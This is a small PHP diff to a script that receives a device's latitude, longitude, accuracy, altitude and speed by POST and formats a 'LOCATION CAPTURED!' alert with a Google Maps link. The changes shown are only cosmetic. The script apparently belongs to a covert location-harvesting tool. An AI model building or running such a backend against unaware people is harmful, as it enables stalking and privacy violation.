@@ -14,7 +14,7 @@ $spd = $_POST['Spd'];
 $status = $_POST['Status'];
 
 // Generate Google Maps Link
-$googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
+$googleMapsLink = "https://maps.google.com/?q=" . $lat . "," . $lon;
 
 // Format Message
 $acc_clean = round($acc, 1); 
@@ -27,8 +27,8 @@ if ($alt < 0) {
 // --- 2. CREATE THE MESSAGE ---
 $message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
 
-$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "</code>\n";
-$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n";
+$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "°</code>\n";
+$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "°</code>\n";
 $message .= "<b>🎯 Accuracy:</b> <code>" . $acc_clean . " m</code>\n";
 $message .= "<b>🏔 Altitude:</b> " . $alt_text . "\n"; 
 $message .= "<b>🧭 Direction:</b> " . $dir . "\n";
